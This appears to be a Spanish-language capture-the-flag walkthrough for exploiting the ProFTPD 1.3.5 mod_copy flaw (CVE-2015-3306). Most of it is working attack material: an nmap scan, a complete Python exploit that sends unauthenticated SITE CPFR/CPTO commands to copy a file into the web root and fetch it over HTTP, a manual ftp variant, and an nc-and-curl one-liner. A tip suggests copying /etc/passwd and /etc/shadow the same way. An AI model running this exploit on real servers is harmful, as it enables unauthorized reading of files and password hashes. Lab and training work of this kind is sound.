# ProFTPD CVE-2015-3306

## üéØ Objetivo
Explotar ProFTPD 1.3.5 para extraer `/secret.txt` usando la vulnerabilidad mod_copy

## Pasos

### 1. Reconocimiento (30 segundos)
```bash
nmap -sV -p21,80 <TARGET_IP>
```
**Buscar**: ProFTPD 1.3.5 en puerto 21 + HTTP en puerto 80

### 2. Crear el Exploit (2 minutos)
Crear archivo `exploit.py`:

```python
#!/usr/bin/env python3
import socket
import sys
import requests

def exploit(target):
    # Conectar FTP
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target, 21))
    
    # Recibir banner
    banner = client.recv(1024)
    print(f"[+] Banner: {banner.decode().strip()}")
    
    # Copiar archivo secreto
    client.send(b"SITE CPFR /secret.txt\r\n")
    resp = client.recv(1024)
    print(f"[+] CPFR: {resp.decode().strip()}")
    
    # Moverlo a directorio web
    client.send(b"SITE CPTO /var/www/html/secret.txt\r\n")
    resp = client.recv(1024)
    print(f"[+] CPTO: {resp.decode().strip()}")
    
    client.close()
    
    # Obtener el secreto v√≠a HTTP
    try:
        r = requests.get(f"http://{target}/secret.txt")
        if r.status_code == 200:
            print(f"[+] FLAG ENCONTRADA:")
            print(r.text)
        else:
            print("[!] No se pudo acceder al archivo")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python3 {sys.argv[0]} <IP>")
        exit(1)
    exploit(sys.argv[1])
```

### 3. Ejecutar el Exploit (10 segundos)
```bash
python3 exploit.py <TARGET_IP>
```

### 4. Alternativa Manual FTP
```bash
ftp <TARGET_IP>
# Dentro del FTP:
quote SITE CPFR /secret.txt
quote SITE CPTO /var/www/html/secret.txt
quit

# Obtener flag:
curl http://<TARGET_IP>/secret.txt
```

## üîç Qu√© Buscar

**Respuestas Exitosas:**
- `350 File or directory exists, ready for destination name` (CPFR)
- `250 Copy successful` (CPTO)
- HTTP 200 cuando accedas al archivo

**Si Falla:**
- Probar otras rutas: `/tmp/secret.txt`, `/home/secret.txt`
- Verificar que el directorio web sea correcto

## üí° Tips

1. **Sin autenticaci√≥n**: Este exploit no requiere credenciales FTP
2. **Funciona porque**: El m√≥dulo mod_copy permite copiar archivos arbitrarios
3. **El truco**: Copiar archivos del sistema al directorio web para acceso HTTP
4. **Otros archivos**: Tambi√©n puedes copiar `/etc/passwd`, `/etc/shadow`, etc.

## üöÄ Comando One-Liner

```bash
echo -e "SITE CPFR /secret.txt\r\nSITE CPTO /var/www/html/secret.txt\r\nQUIT\r\n" | nc <TARGET_IP> 21 && curl http://<TARGET_IP>/secret.txt
```

4. **FLAG CAPTURADA** ‚úÖ
